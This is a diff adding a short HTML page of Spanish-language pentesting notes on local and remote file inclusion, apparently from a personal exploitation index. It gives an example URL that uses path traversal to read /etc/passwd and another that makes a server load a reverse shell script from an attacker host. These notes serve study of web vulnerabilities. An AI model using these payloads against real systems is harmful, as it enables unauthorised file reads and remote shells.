@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>LFI / RFI</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>LFI / RFI</h1><br/><strong><span style="text-decoration:underline;">LOCAL FILE INCLUSION</span></strong><br /><br />A traves de una mala sanitización de la web podemos acceder a archivos del servidor<br /><br /><span style="color:#d50cbb;">http://localhost/wp/wp-plugin/lfi/lfi.php?file=../../../../../../etc/passwd</span><br /><br />En este ejemplo aprovechamos la vulnerabilidad de un plugin que nos permite leer archivos del servidor y aplicamos un path transversal para ver el archivo /etc/passwd<br /><br /><strong><span style="text-decoration:underline;">REMOTE FILE INCLUSION</span></strong><br /><br />A traves de una mala sanitización de la web podemos acceder a archivos externos desde el servidor<br /><br /><span style="color:#d50cbb;">http://localhost/wp/wp-plugin/rfi/rfi.php?path=http://remoteserver/reverse_shell.php</span><br /><br />En este ejemplo vemos que un RFI es todo lo contrario a un LFI, ya que en este apuntamos desde el servidor victima hacia nuestra maquina atacante<br /><br /><br /><br /><br /><a href="Explotacion.html">Volver al indice</a></div>
+</body>
+</html>
